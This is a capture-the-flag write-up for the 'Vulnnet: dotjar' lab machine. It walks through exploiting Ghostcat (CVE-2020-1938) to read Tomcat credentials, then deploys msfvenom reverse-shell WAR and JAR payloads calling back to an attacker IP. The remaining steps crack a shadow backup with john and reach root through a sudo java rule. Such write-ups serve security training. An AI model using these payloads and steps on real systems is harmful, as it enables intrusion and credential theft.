# Vulnnet: dotjar

## Enumeration



```bash
cmd: sudo nmap -oN nmap/simple 10.10.186.166

PORT     STATE SERVICE
8009/tcp open  ajp13
8080/tcp open  http-proxy
```

```bash
cmd: sudo nmap -sC -sV -p 8009,8080 10.10.186.166 -oN nmap/ver

PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http    Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.30
```

- 8009: seems empty
- 8080: basic tomcat page

**No searchsploit entries for Jserv and Tomcat 9.0.30**

## Googling 

- Tomcat version, no findings also
- Jserv 1.3 (hacktricks has a page only for it)
	- By using **"CVE-2020-1938 'Ghostcat'"** -> LFI
	- Get **WEB-IFNF/web.xml**: ```python exp.py -p 8009 -f "WEB-INF/web.xml" 10.10.186.166 > web.xml```
	- Got creds -> ```webdev:Hgj3LA$02D$Fa@21```


The message (in web.xml) also stated that **"GUI access is disabled for security reasons."** meaning that we can't use the webpage to auth (**/manager**)...

## Exploiting

Use a [tool](https://github.com/tomcatmanager/tomcatmanager): ```pip install tomcatmanager && tomcat-manager```

```bash
tomcat-manager > connect http://10.10.186.166:8080/manager webdev
Password:Hgj3LA$02D$Fa@21
# success!
```

Need to generate a war file to be deployed

```bash
cmd: msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.9.128.84 LPORT=1414 -f war -o rce.war

#inside tomcat manager
tomcat-manager > deploy local rce.war /sampleapp
```


1. Listen at the defined port
2. access: http://address:8080/sampleapp

**Success!**

## Machine Enumeration
	

```bash
cmd: whoami && id
web
uid=1001(web) gid=1001(web) groups=1001(web)

cmd: cat /etc/passwd | grep -E '/*sh'
root:x:0:0:root:/root:/bin/bash
jdk-admin:x:1000:1000:jdk-admin,,,:/home/jdk-admin:/bin/bash
web:x:1001:1001:,,,:/home/web:/bin/bash
```

### Backups found!

```bash
-rw-r--r--  1 root root       485 Jan 16  2021 shadow-backup-alt.gz	
```

**Get the zip file and passwd, to unshadow and crack the password's hases**
	
## Cracking shadow hashes

```bash
cmd: unshadow passwd shadow
cmd: john --wordlist=rockyou-75.txt unshadowed
794613852        (jdk-admin)

cmd: su jdk-admin
Password: 794613852

cmd: whoami && id
jdk-admin
uid=1000(jdk-admin) gid=1000(jdk-admin) groups=1000(jdk-admin),24(cdrom)

cmd: cat ~/user.txt
# Flag: THM{1ae87fa6ec2cd9f840c68cbad78e9351}
```	

## Enumeration

```bash	
cmd: sudo -l 
	
	User jdk-admin may run the following commands on vulnnet-dotjar:
	    (root) /usr/bin/java -jar *.jar
```

We can probably reuse the inital .war file (but a .jar needs to be generated)

```bash	
cmd: msfvenom --platform java -f jar -p java/meterpreter/reverse_tcp LHOST=10.9.128.84 LPORT=1415 -o privesc.jar
		
# It failed: java.lang.OutOfMemoryError: Java heap space sent 10, rcvd 43 : Connection reset by peer
```

- I tried to compile locally, but different versions
- Compiled on the machine (the code is in these note's repo folder jar_privesc)

```bash
cmd (compile): javac privesc.java
cmd (build jar): jar cfvm privesc.jar MANIFEST.MF privesc.java
cmd (run): sudo /usr/bin/java -jar privesc.jar
cmd: whoami && id

root
uid=1000(jdk-admin) gid=1000(jdk-admin) euid=0(root) egid=0(root) groups=0(root),24(cdrom),1000(jdk-admin)

cmd: cat /root/root.txt
# FLAG: THM{464c29e3ffae05c2e67e6f0c5064759c}
```